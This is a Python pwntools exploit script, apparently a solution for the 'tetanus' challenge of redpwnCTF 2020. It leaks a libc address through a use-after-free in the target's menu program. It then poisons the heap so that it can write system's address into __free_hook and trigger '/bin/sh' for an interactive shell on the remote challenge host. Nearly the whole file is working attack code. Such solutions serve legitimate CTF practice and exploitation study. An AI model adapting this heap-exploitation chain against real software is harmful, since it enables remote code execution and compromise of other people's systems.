from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "../bin/tetanus"
#"""
HOST = "2020.redpwnc.tf"
PORT = 31069
"""
HOST = "localhost"
PORT =7777 
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#

libc = ELF('../libc.so.6')
gadget = [0xe6b93, 0xe6b96, 0xe6b99, 0x10afa9]
off_system = libc.symbols["system"]
off_malloc_hook = libc.symbols["__malloc_hook"]
off_free_hook = libc.symbols["__free_hook"]
off_unsorted = off_malloc_hook + 0x70

#libc_binsh = next(libc.search("/bin/sh"))

def add(size):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter("> ", str(size))

def delete(index):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter("> ", str(index))

def edit(index,element, value):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter("> ", str(index))
	conn.sendlineafter("> ", str(element))
	conn.sendlineafter("> ", str(value))

def append(index, element, value):
	conn.sendlineafter("> ", "5")
	conn.sendlineafter("> ", str(index))
	conn.sendlineafter("> ", str(element))
	for i in range(element):
		conn.sendlineafter("> ", str(value[i]))
	
def view(index,element):
	conn.sendlineafter("> ", "6")
	conn.sendlineafter("> ", str(index))
	conn.sendlineafter("> ", str(element))

def exploit():
	for i in range(8):
		add(8)	#size = 0x90
		append(i, 1, [0])
	for i in range(7, -1, -1):
		delete(i)
	view(0,0)	
	conn.recvuntil("Value: ")
	libc_unsorted = int(conn.recvline(),10)
	libc_base = libc_unsorted - off_unsorted
	libc_free_hook = libc_base + off_free_hook
	libc_malloc_hook = libc_base + off_malloc_hook
	libc_system = libc_base + off_system
	print hex(libc_base)
	
	edit(1, 0, libc_free_hook) #use after free
	add(8) #8
	add(8) #9 get libc_free_hook as a chunk
	append(9, 2, [libc_system, u64("/bin/sh;")])

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
